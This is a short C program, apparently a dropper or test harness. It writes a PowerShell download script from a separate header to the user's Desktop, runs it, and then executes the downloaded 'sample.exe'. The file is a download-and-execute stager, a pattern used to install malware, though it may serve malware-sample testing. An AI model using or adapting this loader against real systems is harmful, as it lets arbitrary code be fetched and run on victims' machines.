#include <stdio.h>
#include <stdlib.h>
#include "helpers.h"
#include "script_constants_c/script_constants.h"


int main() {
    const size_t bufferLen = 300;
    char *userProfilePath = getenv("UserProfile");

    char download_script_path[bufferLen];
    snprintf(download_script_path, bufferLen, "%s\\Desktop\\download.ps1", userProfilePath);
    write_string(download_script_path, download_script);
    int return_val = run_powershell_script(download_script_path);
    if (return_val != 0) {
        return return_val;
    }
    
    char samplePath[bufferLen];
    snprintf(samplePath, bufferLen, "%s\\Desktop\\sample.exe", userProfilePath);
    return run_command(samplePath);
}